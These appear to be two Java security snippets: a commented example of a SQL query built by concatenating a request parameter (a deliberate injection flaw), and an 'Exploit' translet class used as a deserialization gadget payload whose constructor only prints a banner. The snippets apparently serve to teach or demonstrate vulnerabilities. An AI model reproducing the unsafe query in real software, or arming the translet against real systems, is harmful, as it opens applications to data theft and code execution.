// Get username from parameters
String username = request.getParameter("username");
// Create a statement from database connection
Statement statement = connection.createStatement();  
// Create unsafe query by concatenating user defined data with query string
String query = "SELECT secret FROM Users WHERE (username = '" + username + "' AND NOT role = 'admin')";
// ... OR ...
// Insecurely format the query string using user defined data 
String query = String.format("SELECT secret FROM Users WHERE (username = '%s' AND NOT role = 'admin')", username);
// Execute query and return the results
ResultSet result = statement.executeQuery(query);

import java.util.Properties;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

public class Exploit extends org.apache.xalan.xsltc.runtime.AbstractTranslet {

    public Exploit() throws Exception {
        super.transletVersion = CURRENT_TRANSLET_VERSION;

        System.err.println("███████╗ ██████╗ ████████╗ ██████╗ ███╗   ███╗ █████╗ ██╗   ██╗ ██████╗ ██████╗  ██╗██╗██╗");     
        System.err.println("██╔════╝██╔═══██╗╚══██╔══╝██╔═══██╗████╗ ████║██╔══██╗╚██╗ ██╔╝██╔═══██╗██╔══██╗ ██║██║██║");    
        System.err.println("███████╗██║   ██║   ██║   ██║   ██║██╔████╔██║███████║ ╚████╔╝ ██║   ██║██████╔╝ ██║██║██║");    
        System.err.println("╚════██║██║   ██║   ██║   ██║   ██║██║╚██╔╝██║██╔══██║  ╚██╔╝  ██║   ██║██╔══██╗ ╚═╝╚═╝╚═╝");    
        System.err.println("███████║╚██████╔╝   ██║   ╚██████╔╝██║ ╚═╝ ██║██║  ██║   ██║   ╚██████╔╝██║  ██║ ██╗██╗██╗");    
        System.err.println("╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═╝╚═╝╚═╝");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {
    }
}
